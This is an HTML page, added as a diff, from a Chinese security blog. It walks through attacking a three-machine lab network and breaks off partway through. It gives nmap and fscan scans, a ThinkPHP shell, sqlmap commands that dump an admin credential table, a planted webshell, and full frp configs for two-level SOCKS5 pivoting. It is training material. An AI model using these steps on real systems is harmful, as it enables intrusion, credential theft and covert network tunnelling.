@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>三层靶机frp - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="三层靶机frp">
+  <meta property="og:description" content="https://blog.csdn.net/qq_61237064/article/details/125602997参考此文搭建环境
+环境拓扑 kali : 192.168.1.133targ1: 192.168.1.135 192.168.22.134 (centos)targ2: 192.168.22.133 192.168.33.130 (ubuntu)targ3: 192.168.33.33 (win7) 靶机1渗透 信息收集 主机探活 &#43; 端口扫描
+nmap 192.168.1.0/24 拿到targ1的ip，且开放了80端口
+外网打点 先访问靶机1的80端口
+tp5 直接工具梭
+顺利拿到shell
+蚁剑查看网络
+内网收集 得到22网段，既然发现了存在192.168.22.x/24 网段，所以尝试对 22 网段进行信息收集，这里使用fscan
+上传fscan 到targ1服务器目录/tmp （如果有杀软容易寄）
+./fscan -h 192.168.22.0/24 -o fscan.log 可以看到192.168.22.133是Target2，还是某个cms的站，80端口开发
+有两种方式进行利用：
+1.对 Target 2 80 端口进行端口转发。 2.使用反向代理，将Target 1 的网络通过vps代理出去。
+代理转发—重点 使用frp方式。
+frp存在服务端（frps）与客户端（frpc）， frps需要一直保持运行，转发方式通过客户端配置文件进行确定。
+一级代理
+配置服务端frps.ini
+[common] bind_addr = 0.0.0.0 # 在服务端上绑定的ip bind_port = 7000 # 在服务端上绑定的端口 启动服务端">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T23:52:36+08:00">
+    <meta property="article:modified_time" content="2024-08-20T23:52:36+08:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="三层靶机frp">
+  <meta name="twitter:description" content="https://blog.csdn.net/qq_61237064/article/details/125602997参考此文搭建环境
+环境拓扑 kali : 192.168.1.133targ1: 192.168.1.135 192.168.22.134 (centos)targ2: 192.168.22.133 192.168.33.130 (ubuntu)targ3: 192.168.33.33 (win7) 靶机1渗透 信息收集 主机探活 &#43; 端口扫描
+nmap 192.168.1.0/24 拿到targ1的ip，且开放了80端口
+外网打点 先访问靶机1的80端口
+tp5 直接工具梭
+顺利拿到shell
+蚁剑查看网络
+内网收集 得到22网段，既然发现了存在192.168.22.x/24 网段，所以尝试对 22 网段进行信息收集，这里使用fscan
+上传fscan 到targ1服务器目录/tmp （如果有杀软容易寄）
+./fscan -h 192.168.22.0/24 -o fscan.log 可以看到192.168.22.133是Target2，还是某个cms的站，80端口开发
+有两种方式进行利用：
+1.对 Target 2 80 端口进行端口转发。 2.使用反向代理，将Target 1 的网络通过vps代理出去。
+代理转发—重点 使用frp方式。
+frp存在服务端（frps）与客户端（frpc）， frps需要一直保持运行，转发方式通过客户端配置文件进行确定。
+一级代理
+配置服务端frps.ini
+[common] bind_addr = 0.0.0.0 # 在服务端上绑定的ip bind_port = 7000 # 在服务端上绑定的端口 启动服务端">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp/" /><link rel="prev" href="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/" /><link rel="next" href="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "三层靶机frp",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp\/"
+        },"genre": "posts","keywords": "","wordcount":  333 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp\/","datePublished": "2024-08-20T23:52:36+08:00","dateModified": "2024-08-20T23:52:36+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">三层靶机frp</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;333 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;2 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#环境拓扑">环境拓扑</a></li>
+    <li><a href="#靶机1渗透">靶机1渗透</a>
+      <ul>
+        <li><a href="#信息收集">信息收集</a></li>
+        <li><a href="#外网打点">外网打点</a></li>
+        <li><a href="#内网收集">内网收集</a></li>
+        <li><a href="#代理转发重点">代理转发—重点</a></li>
+      </ul>
+    </li>
+    <li><a href="#靶机2渗透">靶机2渗透</a>
+      <ul>
+        <li><a href="#外网打点-1">外网打点</a></li>
+        <li><a href="#内网收集-1">内网收集</a></li>
+        <li><a href="#二层代理重点">二层代理——重点</a></li>
+      </ul>
+    </li>
+    <li><a href="#靶机3-win7">靶机3 win7</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><a href="https://blog.csdn.net/qq_61237064/article/details/125602997" target="_blank" rel="noopener noreffer">https://blog.csdn.net/qq_61237064/article/details/125602997</a>
+</p>
+<p>参考此文搭建环境</p>
+<h2 id="环境拓扑">环境拓扑</h2>
+<pre tabindex="0"><code>kali : 192.168.1.133
+targ1: 192.168.1.135  192.168.22.134 (centos)
+targ2: 192.168.22.133 192.168.33.130 (ubuntu)
+targ3: 192.168.33.33 (win7)
+</code></pre><h2 id="靶机1渗透">靶机1渗透</h2>
+<h3 id="信息收集">信息收集</h3>
+<p>主机探活 + 端口扫描</p>
+<pre tabindex="0"><code>nmap 192.168.1.0/24
+</code></pre><!-- raw HTML omitted -->
+<p>拿到targ1的ip，且开放了80端口</p>
+<h3 id="外网打点">外网打点</h3>
+<p>先访问靶机1的80端口</p>
+<!-- raw HTML omitted -->
+<p>tp5 直接工具梭</p>
+<!-- raw HTML omitted -->
+<p>顺利拿到shell</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303071703093.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303071703093.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303071703093.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303071703093.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303071703093.png"
+        title="image-20230307170331059" /></p>
+<p>蚁剑查看网络</p>
+<h3 id="内网收集">内网收集</h3>
+<p>得到22网段，既然发现了存在<code>192.168.22.x/24</code> 网段，所以尝试对 22 网段进行信息收集，这里使用<code>fscan</code></p>
+<p>上传<code>fscan </code>到targ1服务器目录<code>/tmp</code> （如果有杀软容易寄）</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303071743831.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303071743831.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303071743831.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303071743831.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303071743831.png"
+        title="image-20230307174322802" /></p>
+<pre tabindex="0"><code>./fscan -h 192.168.22.0/24 -o fscan.log
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303071745876.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303071745876.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303071745876.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303071745876.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303071745876.png"
+        title="image-20230307174505800" /></p>
+<p>可以看到192.168.22.133是Target2，还是某个cms的站，80端口开发</p>
+<p>有两种方式进行利用：</p>
+<p>1.对 Target 2 80 端口进行端口转发。
+2.使用反向代理，将Target 1 的网络通过vps代理出去。</p>
+<h3 id="代理转发重点">代理转发—重点</h3>
+<p>使用frp方式。</p>
+<p>frp存在服务端（frps）与客户端（frpc）， frps需要一直保持运行，转发方式通过客户端配置文件进行确定。</p>
+<p><strong>一级代理</strong></p>
+<p>配置服务端<code>frps.ini</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>common<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>bind_addr <span style="color:#f92672">=</span> 0.0.0.0   <span style="color:#75715e"># 在服务端上绑定的ip </span>
+</span></span><span style="display:flex;"><span>bind_port <span style="color:#f92672">=</span> <span style="color:#ae81ff">7000</span>      <span style="color:#75715e"># 在服务端上绑定的端口</span>
+</span></span></code></pre></div><p>启动服务端</p>
+<pre tabindex="0"><code>./frps -c ./frps.ini
+</code></pre><!-- raw HTML omitted -->
+<p>配置客户端（受控靶机）</p>
+<p>这里就是被拿shell的target1，先像蚁剑传入frpc和frpc.ini</p>
+<p>配置frpc.ini</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>common<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>server_addr <span style="color:#f92672">=</span> 192.168.1.133  <span style="color:#75715e"># 指向frp服务端绑定的ip</span>
+</span></span><span style="display:flex;"><span>server_port <span style="color:#f92672">=</span> <span style="color:#ae81ff">7000</span>           <span style="color:#75715e"># 指向frp服务端绑定的端口</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>socks5<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>remote_port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1080</span>           <span style="color:#75715e"># 代理所使用的端口，会被转发到服务端</span>
+</span></span><span style="display:flex;"><span>plugin <span style="color:#f92672">=</span> socks5              <span style="color:#75715e"># 代理的类型</span>
+</span></span></code></pre></div><p>启动客户端</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>chmod +x frpc
+</span></span><span style="display:flex;"><span>./frpc -c ./frpc.ini
+</span></span></code></pre></div><p>可以看到服务端显示连接成功</p>
+<!-- raw HTML omitted -->
+<p>此时，我们就成功在kali和target1之间搭建了一个SOCKS5代理服务。</p>
+<p>然后借助第三方工具，可以让计算机的其他应用使用这个socks5代理，如proxychains，proxifier</p>
+<p>这里在Linux下使用<code>proxychains</code>为例，用vim编辑/etc/proxychains.conf ，将socks5代理服务器的地址指向frp服务端的地址。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081525389.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081525389.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081525389.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081525389.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081525389.png"
+        title="image-20230308152543365" /></p>
+<p>然后我们在命令行前面加上<code>proxychains</code> 便可以应用此socks5代理</p>
+<p>这里通过代理登录targ2的ssh，没有代理则访问不到22网段</p>
+<!-- raw HTML omitted -->
+<p>(当然这个密码是我知道的) 爆破也是可以的</p>
+<!-- raw HTML omitted -->
+<p>代理使用nmap继续扫</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>proxychains nmap -Pn -sT 192.168.22.133 
+</span></span></code></pre></div><!-- raw HTML omitted -->
+<p>浏览器设置socks5的代理即可访问target2的80站</p>
+<p>代理ip写服务端的ip，端口是之前设置的1080</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081607363.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081607363.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081607363.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081607363.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081607363.png"
+        title="image-20230308160701305" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081641185.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081641185.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081641185.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081641185.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081641185.png"
+        title="image-20230308164155140" /></p>
+<p>便可以成功访问 targ2的站</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081642475.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081642475.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081642475.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081642475.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081642475.png"
+        title="image-20230308164231414" /></p>
+<p>虽然这里浏览器能够正常访问了，但是在渗透的过程中常常会使用安全工具进行扫描或者漏洞利用，这些工具大部分没有预留走代理的配置，或者系统的代理往往不会生效，这种情况怎么办呢？</p>
+<p>以下两个软件可以在win下使用，不多介绍了</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<h2 id="靶机2渗透">靶机2渗透</h2>
+<h3 id="外网打点-1">外网打点</h3>
+<p>这个不是重点</p>
+<p>源码中有提示SQL注入点：/index.php?r=vul&amp;keyword=1</p>
+<p>尝试用sqlmap梭 ,依然是要挂代理</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>proxychains sqlmap -u <span style="color:#e6db74">&#34;http://192.168.22.133/index.php?r=vul&amp;keyword=1&#34;</span> --dbs
+</span></span><span style="display:flex;"><span>proxychains sqlmap -u <span style="color:#e6db74">&#34;http://192.168.22.133/index.php?r=vul&amp;keyword=1&#34;</span> -D bagecms --tables
+</span></span><span style="display:flex;"><span>proxychains sqlmap -u <span style="color:#e6db74">&#34;http://192.168.22.133/index.php?r=vul&amp;keyword=1&#34;</span> -D bagecms -T bage_admin --columns
+</span></span><span style="display:flex;"><span>proxychains sqlmap -u <span style="color:#e6db74">&#34;http://192.168.22.133/index.php?r=vul&amp;keyword=1&#34;</span> -D bagecms -T bage_admin -C username,password --dump
+</span></span></code></pre></div><p>是很顺利梭出来了</p>
+<!-- raw HTML omitted -->
+<p>登录后台,然后修改模板文件，写入一句话</p>
+<!-- raw HTML omitted -->
+<h3 id="内网收集-1">内网收集</h3>
+<p>写入shell后，需要设置代理来进行连接，蚁剑有代理设置模块</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>继续信息收集</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081815011.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081815011.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081815011.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081815011.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081815011.png"
+        title="image-20230308181516961" /></p>
+<p>出现33网段</p>
+<p>上传fscan扫一遍33网段</p>
+<!-- raw HTML omitted -->
+<p>直接扫出了win7 拿到了192.168.33.33 目标</p>
+<p>把MS17-010永恒之蓝都带出来了</p>
+<h3 id="二层代理重点">二层代理——重点</h3>
+<p>(这里执行执行frp时，记得把蚁剑代理关闭)</p>
+<p>现在如何用kali的1网段打到targ2的33网段，继续frp二级代理</p>
+<p>目前我们有kali的1到centos的22网段的代理</p>
+<p>那么继续搞一个 centos的22到ubuntu的33网段的代理</p>
+<p>是不是就实现了从kali的1网段代理到ubuntu的33网段。</p>
+<pre tabindex="0"><code>kali:1&lt;----&gt;centos:22
+             centos:22&lt;----&gt;ubuntu:33
+</code></pre><p>那么centos现在在中间是又当服务端，又当客户端。</p>
+<p>我们一个个看：</p>
+<p>1.kali服务端frps.ini 依然如旧</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>common<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>bind_addr <span style="color:#f92672">=</span> 0.0.0.0   <span style="color:#75715e"># 在服务端上绑定的ip</span>
+</span></span><span style="display:flex;"><span>bind_port <span style="color:#f92672">=</span> <span style="color:#ae81ff">7000</span>      <span style="color:#75715e"># 在服务端上绑定的端口</span>
+</span></span></code></pre></div><pre tabindex="0"><code>./frps -c ./frps.ini
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081924913.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081924913.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081924913.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081924913.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081924913.png"
+        title="image-20230308192458879" /></p>
+<p>2.centos客户端frpc.ini</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>common<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>server_addr <span style="color:#f92672">=</span> 192.168.1.133    <span style="color:#75715e"># kali的frp服务端绑定的ip</span>
+</span></span><span style="display:flex;"><span>server_port <span style="color:#f92672">=</span> <span style="color:#ae81ff">7000</span>             <span style="color:#75715e"># kali的frp服务端绑定的端口</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>socks5_forward<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>type <span style="color:#f92672">=</span> tcp                     <span style="color:#75715e"># 所使用的协议类型</span>
+</span></span><span style="display:flex;"><span>local_ip <span style="color:#f92672">=</span> 192.168.22.134      <span style="color:#75715e"># 本地监听的ip地址（本地的ip）</span>
+</span></span><span style="display:flex;"><span>local_port <span style="color:#f92672">=</span> <span style="color:#ae81ff">10808</span>             <span style="color:#75715e"># 要转发的本地端口</span>
+</span></span><span style="display:flex;"><span>remote_port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1080</span>             <span style="color:#75715e"># 要转发到的远程端口</span>
+</span></span></code></pre></div><pre tabindex="0"><code>./frpc -c ./frpc.ini
+</code></pre><p>3.centos服务端frps.ini</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>common<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>bind_addr <span style="color:#f92672">=</span> 192.168.22.134   <span style="color:#75715e"># centos上本地ip</span>
+</span></span><span style="display:flex;"><span>bind_port <span style="color:#f92672">=</span> <span style="color:#ae81ff">7000</span>             <span style="color:#75715e"># centos的frp服务端绑定的端口</span>
+</span></span></code></pre></div><pre tabindex="0"><code>./frps -c ./frps.ini
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081938655.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081938655.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081938655.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081938655.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081938655.png"
+        title="image-20230308193835625" /></p>
+<p>4.ubuntu客户端frpc.ini</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>common<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>server_addr <span style="color:#f92672">=</span> 192.168.22.134 <span style="color:#75715e"># 指向centos的服务端绑定的ip</span>
+</span></span><span style="display:flex;"><span>server_port <span style="color:#f92672">=</span> <span style="color:#ae81ff">7000</span>           <span style="color:#75715e"># 指向centos的服务端绑定的端口</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>socks5<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>type <span style="color:#f92672">=</span> tcp
+</span></span><span style="display:flex;"><span>remote_port <span style="color:#f92672">=</span> <span style="color:#ae81ff">10808</span>
+</span></span><span style="display:flex;"><span>plugin <span style="color:#f92672">=</span> socks5       <span style="color:#75715e"># 代理的类型</span>
+</span></span></code></pre></div><pre tabindex="0"><code>./frpc -c ./frpc.ini
+</code></pre><p>顺利连接</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081938909.png"
